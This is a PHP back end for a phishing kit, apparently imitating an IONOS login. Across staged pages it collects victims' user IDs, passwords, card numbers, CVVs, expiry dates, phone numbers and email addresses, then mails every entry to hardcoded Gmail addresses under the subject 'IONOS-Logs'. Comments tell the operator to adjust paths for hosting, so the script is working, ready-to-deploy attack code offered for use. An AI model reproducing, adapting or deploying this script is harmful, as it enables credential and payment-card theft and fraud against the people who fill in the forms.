<?php  

error_reporting(0);
session_start();

function sanitize($value) {
    return htmlspecialchars(trim($value));
}


if(isset($_POST['login'])) {
    $userId = sanitize($_POST['userID']);
    $password = sanitize($_POST['password']);

    $_SESSION['STAGE'] = "card";
    $_SESSION['VALUE'] = json_encode([
        "userID" => $userId,
        "password" => $password,
    ]);

    // REMEMBER TO CHANGE THIS PATH IF YOUR'RE HOSTING ON DIFFERENT SERVER
    header("Location: ./card.php");
}


if(isset($_POST['card'])) {
    $cardNumber = sanitize($_POST['cardNumber']);
    $cvv = sanitize($_POST['cvv']);
    $exp = sanitize($_POST['exp']);

    $_SESSION['STAGE'] = "epass";

    $prevValues = json_decode($_SESSION['VALUE'], true);
    $prevValues["cardNumber"] = $cardNumber;
    $prevValues["CVV"] = $cvv;
    $prevValues["expiry"] = $exp;


    $_SESSION['VALUE'] = json_encode($prevValues);

    // REMEMBER TO CHANGE THIS PATH IF YOUR'RE HOSTING ON DIFFERENT SERVER
    header("Location: ./epass.php");
}


if(isset($_POST['epass'])) {
    $phone = sanitize($_POST['phone']);
    $email = sanitize($_POST['email']);
    $password = sanitize($_POST['password']);

    $_SESSION['STAGE'] = "success";

    $prevValues = json_decode($_SESSION['VALUE'], true);
    $prevValues["phone"] = $phone;
    $prevValues["email"] = $email;
    $prevValues["password"] = $password;

    $_SESSION['VALUE'] = json_encode($prevValues);

    sendEmail($prevValues);

    // REMEMBER TO CHANGE THIS PATH IF YOUR'RE HOSTING ON DIFFERENT SERVER
    header("Location: ./success.php");
}

// $EMAIL = "gottmacht.empire@gmail.com";
// $SENDER_EMAIL = "gottmacht.empire@yandex.com";

$EMAIL = "alexjace151@gmail.com";
$SENDER_EMAIL = "jacealex151@gmail.com";

function sendEmail($prevValues, $subject = "IONOS-Logs") {
    global $EMAIL;
    global $SENDER_EMAIL;
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";

    $message = "<!DOCTYPE html>
    <html lang='en'>
        <head>
            <meta charset='UTF-8'>
            <style>
                * {
                    margin: 0;
                    padding: 0;
    
                    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
                }
                .container {
                    width: 100%;
                    max-width: 600px;
                    margin: 0 auto;
                    padding: 2rem;
                }
    
                .dotted {
                    height: 1px;
                    margin: 2rem 0;
                    border-bottom: 2px dashed #000;
                }
    
                .flex {
                    display: flex;
                    align-items: center;
                    margin: .5rem;
                }
    
                .title {
                    font-size: 1rem;
                    font-weight: 500;
                    margin-right: .8rem;
                }
    
                .content {
                    flex: 1;
                    font-size: 1rem;
                    font-weight: 600;
                }
            </style>
        </head>
        <body>
            <div class='container'>
                <div class='dotted'></div>
                <div class='flex'>
                    <p class='title'>User ID:</p>
                    <p class='content'>{{userID}}</p>
                </div>
    
                <div class='flex'>
                    <p class='title'>Password:</p>
                    <p class='content'>{{password}}</p>
                </div>
    
                <div class='dotted'></div>
    
                <div class='flex'>
                    <p class='title'>Card Number:</p>
                    <p class='content'>{{cardNumber}}</p>
                </div>
    
                <div class='flex'>
                    <p class='title'>Card Expiry:</p>
                    <p class='content'>{{expiry}}</p>
                </div>
    
                <div class='flex'>
                    <p class='title'>Card CVV:</p>
                    <p class='content'>{{cvv}}</p>
                </div>
    
                <div class='dotted'></div>
    
                <div class='flex'>
                    <p class='title'>Phone No:</p>
                    <p class='content'>{{phone}}</p>
                </div>
    
                <div class='flex'>
                    <p class='title'>Email:</p>
                    <p class='content'>{{email}}</p>
                </div>
            </div>
        </body>
    </html>";
    
    /* 
         [
            "userID" => $userId,
            "password" => $password,
            "CVV" => $cvv,
            "expiry" => $exp,
            "cardNumber" => $card,
            "phone" => $phone,
            "email" => $email
        ]
    */
    $values = $prevValues;

    $message = str_replace("{{userID}}", $values["userID"], $message);
    $message = str_replace("{{password}}", $values["password"], $message);
    $message = str_replace("{{cardNumber}}", $values["cardNumber"], $message);
    $message = str_replace("{{expiry}}", $values["expiry"], $message);
    $message = str_replace("{{cvv}}", $values["CVV"], $message);
    $message = str_replace("{{phone}}", $values["phone"], $message);
    $message = str_replace("{{email}}", $values["email"], $message);

    // Create email headers
    $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
    $headers .= "Reply-to: $SENDER_EMAIL\r\n";

    return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
}
